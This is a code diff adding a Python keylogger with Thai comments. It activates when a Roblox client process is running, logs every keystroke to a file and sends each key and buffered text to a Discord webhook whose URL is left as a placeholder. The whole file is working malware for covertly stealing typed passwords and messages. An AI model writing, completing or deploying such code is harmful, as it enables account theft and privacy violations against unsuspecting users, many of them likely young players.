@@ -1,0 +1,82 @@
+from pynput import keyboard
+import psutil
+import time
+import requests
+import threading
+
+logfile = "roblox_keys.txt"
+WEBHOOK_URL = "ใส่ URL Discord Webhook ของคุณที่นี่"
+
+buffer = ""
+lock = threading.Lock()
+last_time = time.time()
+
+def is_roblox_running():
+    roblox_processes = ["RobloxPlayerBeta.exe", "RobloxApp.exe"]
+    for proc in psutil.process_iter(['name']):
+        if proc.info['name'] in roblox_processes:
+            return True
+    return False
+
+def send_to_discord(message):
+    data = {"content": message}
+    try:
+        response = requests.post(WEBHOOK_URL, json=data)
+        if response.status_code != 204:
+            print(f"Failed to send webhook: {response.status_code}")
+    except Exception as e:
+        print(f"Error sending webhook: {e}")
+
+def send_buffer_periodically():
+    global buffer, last_time
+    while True:
+        time.sleep(1)
+        lock.acquire()
+        elapsed = time.time() - last_time
+        if buffer and elapsed > 10.0:  # ถ้าไม่มีการพิมพ์เพิ่ม 10 วินาที
+            send_to_discord(f"**ข้อความต่อเนื่อง:** {buffer}")
+            buffer = ""
+        lock.release()
+
+def on_press(key):
+    global buffer, last_time
+    try:
+        char = key.char
+    except AttributeError:
+        special_keys = {
+            keyboard.Key.space: " ",
+            keyboard.Key.enter: "\n",
+            keyboard.Key.tab: "\t",
+            keyboard.Key.backspace: "[Backspace]",
+        }
+        char = special_keys.get(key, f"[{key.name}]")
+
+    # บันทึกลงไฟล์
+    with open(logfile, "a", encoding="utf-8") as f:
+        f.write(char)
+
+    # ส่งข้อความทีละตัวทันที
+    send_to_discord(char)
+
+    lock.acquire()
+    if char == "\n":  # เมื่อกด Enter ส่ง buffer ทันที
+        if buffer:
+            send_to_discord(f"**ข้อความต่อเนื่อง:** {buffer}")
+            buffer = ""
+    else:
+        buffer += char
+    last_time = time.time()
+    lock.release()
+
+if __name__ == "__main__":
+    threading.Thread(target=send_buffer_periodically, daemon=True).start()
+
+    while True:
+        if is_roblox_running():
+            print("Roblox detected. Starting keylogger.")
+            with keyboard.Listener(on_press=on_press) as listener:
+                while is_roblox_running():
+                    time.sleep(1)
+                listener.stop()
+                print("Roblox closed. Stopping keylogger.")
+        time.sleep(5)￼Enter
